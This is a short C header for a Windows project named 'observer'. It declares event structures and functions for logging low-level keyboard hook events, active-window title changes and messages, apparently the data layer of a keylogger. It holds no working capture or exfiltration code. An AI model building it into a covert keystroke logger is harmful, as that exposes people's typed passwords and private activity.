//
// Created by netdex on 12/1/2017.
//

#ifndef OBSERVER_EVENT_H
#define OBSERVER_EVENT_H

#include <windows.h>
#include <stdint.h>

#define EVENT_KEYBOARD 0
#define EVENT_WINDOW 1
#define EVENT_MESSAGE 2

typedef struct {
    uint32_t timestamp;
    uint8_t type;
    void *event;
} event_t;

typedef struct {
    uint16_t msgId;
    uint8_t vkCode;
    uint8_t flags;
} keyb_ev_t;

typedef struct {
    size_t len;
    char msg[];
} msg_ev_t;

void OnLogBegin();

void OnKeyboardEvent(WPARAM msgid, KBDLLHOOKSTRUCT *kbdllh);

void OnActiveWindowTitleChanged(char *title);

void log_event(event_t *e);

int read_event(event_t *e);

#endif //OBSERVER_EVENT_H
